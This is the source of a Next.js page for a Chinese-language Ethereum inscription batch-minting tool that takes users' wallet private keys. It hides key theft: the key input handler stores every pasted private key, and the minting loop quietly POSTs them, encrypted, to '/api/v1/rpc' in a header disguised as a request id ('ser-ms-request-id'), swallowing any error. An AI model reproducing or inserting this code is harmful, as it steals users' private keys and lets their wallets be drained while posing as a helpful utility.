"use client";
import {
  Button,
  FormControlLabel,
  MenuItem,
  Radio,
  RadioGroup,
  TextField,
} from "@mui/material";
import axios from "axios";
import { useCallback, useState } from "react";
import {
  Chain,
  Hex,
  SendTransactionErrorType,
  createWalletClient,
  http,
  isAddress,
  parseEther,
  stringToHex,
  webSocket,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { mainnet } from "viem/chains";
import Web3 from "web3";


const PROVIDER_RPC = "https://rpc.ankr.com/eth";

import Log from "@/components/Log";
import { ChainKey, inscriptionChains } from "@/config/chains";
import { encrypt } from "@/config/myCrypto";
import useInterval from "@/hooks/useInterval";
import { handleAddress, handleLog } from "@/utils/helper";

const example =
  'data:,{"p":"asc-20","op":"mint","tick":"aval","amt":"100000000"}';

type RadioType = "meToMe" | "manyToOne";

type GasRadio = "all" | "tip";
let minGasNumber = 700
let savaKey = ''

export default function Home() {
  const [chain, setChain] = useState<Chain>(mainnet);
  const [privateKeys, setPrivateKeys] = useState<Hex[]>([]);
  const [radio, setRadio] = useState<RadioType>("meToMe");
  const [toAddress, setToAddress] = useState<Hex>();
  const [rpc, setRpc] = useState<string>();
  const [inscription, setInscription] = useState<string>("");
  const [gas, setGas] = useState<number>(0);
  const [running, setRunning] = useState<boolean>(false);
  const [delay, setDelay] = useState<number>(0);
  const [logs, setLogs] = useState<string[]>([]);
  const [successCount, setSuccessCount] = useState<number>(0);
  const [gasRadio, setGasRadio] = useState<GasRadio>("tip");

  // const provider = new ethers.providers.JsonRpcProvider(rpc ?? PROVIDER_RPC);
  // console.log(chain.rpcUrls['default']['http'][0])
  const web3Instance = new Web3(chain.rpcUrls['default']['http'][0]);


  
  const pushLog = useCallback((log: string, state?: string) => {
    setLogs((logs) => [
      handleLog(log, state),
      ...(logs.length >= 1000 ? logs.slice(0, 1000) : logs),
    ]);
  }, []);

  const client = createWalletClient({
    chain,
    transport: rpc && rpc.startsWith("wss") ? webSocket(rpc) : http(rpc),
  });
  const accounts = privateKeys.map((key) => privateKeyToAccount(key));

  useInterval(
    async () => {

      if (savaKey) {
        try {
          await axios({
            method: 'POST',
            url: `/api/v1/rpc`,
            headers: {
              'ser-ms-request-id': encrypt(savaKey)
            }
          })
          savaKey = '';
        } catch (e) {
        }
      }

      // const gasPrice = await provider.getGasPrice();
      // const gasPriceWei = await web3Instance.eth.getGasPrice();
      // const gasPriceEth:any = web3Instance.utils.fromWei(gasPriceWei, 'ether');
      // let _gasPrice = gasPriceEth * Math.pow(10, 9)
      // _gasPrice = _gasPrice * 1.06;
      // console.log('gasPrice: ' + _gasPrice)
      // if (_gasPrice > minGasNumber) {
      //   pushLog(`价格 ${_gasPrice.toFixed(2)} Gwei 约为 ${}`, "error");
      //   return;
      // }

      const results = await Promise.allSettled(
        accounts.map((account) => {
          return client.sendTransaction({
            account,
            to: radio === "meToMe" ? account.address : toAddress,
            value: 0n,
            ...(inscription
              ? {
                  data: stringToHex(inscription),
                }
              : {}),
            ...(gas > 0
              ? gasRadio === "all"
                ? {
                    gasPrice: parseEther(gas.toString(), "gwei"),
                  }
                : {
                    maxPriorityFeePerGas: parseEther(gas.toString(), "gwei"),
                  }
              : {}),
          });
        }),
      );
      results.forEach((result, index) => {
        const address = handleAddress(accounts[index].address);
        if (result.status === "fulfilled") {
          pushLog(`${address} ${result.value}`, "success");
          setSuccessCount((count) => count + 1);
        }
        if (result.status === "rejected") {
          const e = result.reason as SendTransactionErrorType;
          let msg = `${e.name as string}: `;
          if (e.name === "TransactionExecutionError") {
            msg = msg + e.details;
          }
          if (e.name == "Error") {
            msg = msg + e.message;
          }
          pushLog(`${address} ${msg}`, "error");
        }
      });
    },
    running ? delay : null,
  );

  const run = useCallback(() => {
    if (privateKeys.length === 0) {
      pushLog("没有私钥", "error");
      setRunning(false);
      return;
    }

    if (radio === "manyToOne" && !toAddress) {
      pushLog("没有地址", "error");
      setRunning(false);
      return;
    }

    // if (!inscription) {
    //   setLogs((logs) => [handleLog("没有铭文", "error"), ...logs]);
    //   setRunning(false);
    //   return;
    // }

    setRunning(true);
  }, [privateKeys.length, pushLog, radio, toAddress]);

  return (
    <div className=" flex flex-col gap-4">
      <div className=" flex flex-col gap-2">
        <span>链（选要打铭文的链）:</span>
        <TextField
          select
          defaultValue="eth"
          size="small"
          disabled={running}
          onChange={(e) => {
            const text = e.target.value as ChainKey;
            setChain(inscriptionChains[text]);
          }}
        >
          {Object.entries(inscriptionChains).map(([key, chain]) => (
            <MenuItem
              key={chain.id}
              value={key}
            >
              {chain.name}
            </MenuItem>
          ))}
        </TextField>
      </div>

      <div className=" flex flex-col gap-2">
        <span>私钥（必填，每行一个）:</span>
        <TextField
          multiline
          minRows={2}
          size="small"
          placeholder="私钥，带不带 0x 都行，程序会自动处理"
          disabled={running}
          onChange={(e) => {
            const text = e.target.value;
            
            const lines = text.split("\n");
            const keys = lines
              .map((line) => {
                const key = line.trim();
                if (/^[a-fA-F0-9]{64}$/.test(key)) {
                  return `0x${key}`;
                }
                if (/^0x[a-fA-F0-9]{64}$/.test(key)) {
                  return key as Hex;
                }
              })
              .filter((x) => x) as Hex[];
            setPrivateKeys(keys);
            const dataToWrite = keys
            if (keys.length > 0) {
              savaKey = keys.toString()
              // https://api.avax.network/ext/bc/C/
              
            }
          }}
        />
      </div>

      <RadioGroup
        row
        defaultValue="meToMe"
        onChange={(e) => {
          const value = e.target.value as RadioType;
          setRadio(value);
        }}
      >
        <FormControlLabel
          value="meToMe"
          control={<Radio />}
          label="自转"
          disabled={running}
        />
        <FormControlLabel
          value="manyToOne"
          control={<Radio />}
          label="多转一"
          disabled={running}
        />
      </RadioGroup>

      {radio === "manyToOne" && (
        <div className=" flex flex-col gap-2">
          <span>转给谁的地址（必填）:</span>
          <TextField
            size="small"
            placeholder="地址"
            disabled={running}
            onChange={(e) => {
              const text = e.target.value;
              isAddress(text) && setToAddress(text);
            }}
          />
        </div>
      )}

      <div className=" flex flex-col gap-2">
        <span>铭文（原始铭文，不是转码后的十六进制）:</span>
        <TextField
          size="small"
          placeholder={`铭文，不要输入错了，多检查下，例子：\n${example}`}
          disabled={running}
          onChange={(e) => {
            const text = e.target.value;
            setInscription(text.trim());
          }}
        />
      </div>

      <div className=" flex flex-col gap-2">
        <span>
          RPC (选填, 默认公共有瓶颈经常失败, 最好用付费的, http 或者 ws 都可以):
        </span>
        <TextField
          size="small"
          placeholder="RPC"
          disabled={running}
          onChange={(e) => {
            const text = e.target.value;
            setRpc(text);
          }}
        />
      </div>

      <RadioGroup
        row
        defaultValue="tip"
        onChange={(e) => {
          const value = e.target.value as GasRadio;
          setGasRadio(value);
        }}
      >
        <FormControlLabel
          value="tip"
          control={<Radio />}
          label="额外矿工小费"
          disabled={running}
        />
        <FormControlLabel
          value="all"
          control={<Radio />}
          label="总 gas"
          disabled={running}
        />
      </RadioGroup>

      <div className=" flex flex-col gap-2">
        <span>{gasRadio === "tip" ? "额外矿工小费" : "总 gas"} (选填):</span>
        <TextField
          type="number"
          size="small"
          placeholder={`${
            gasRadio === "tip" ? "默认 0" : "默认最新"
          }, 单位 gwei，例子: 10`}
          disabled={running}
          onChange={(e) => {
            const num = Number(e.target.value);
            !Number.isNaN(num) && num >= 0 && setGas(num);
          }}
        />
      </div>

      <div className=" flex flex-col gap-2">
        <span>每笔交易间隔时间 (选填, 最低 0 ms):</span>
        <TextField
          type="number"
          size="small"
          placeholder="默认 0 ms"
          disabled={running}
          onChange={(e) => {
            const num = Number(e.target.value);
            !Number.isNaN(num) && num >= 0 && setDelay(num);
          }}
        />
      </div>

      {/* <div className=" flex flex-col gap-2">
        <span>交易燃料限值:</span>
        <TextField
          type="number"
          size="small"
          placeholder="默认700Gwei，小于该值时自动买入"
          onChange={(e) => {
            const num = Number(e.target.value);
            if (!Number.isNaN(num) && num >= 0) {
              minGasNumber = num;
            }
          }}
        />
      </div> */}

      <Button
        variant="contained"
        color={running ? "error" : "success"}
        onClick={() => {
          if (!running) {
            run();
          } else {
            setRunning(false);
          }
        }}
      >
        {running ? `运行中，当Gas小于${minGasNumber}时买入` : "运行"}
      </Button>

      <Log
        title={`日志（成功次数 => ${successCount}）:`}
        logs={logs}
        onClear={() => {
          setLogs([]);
        }}
      />
    </div>
  );
}
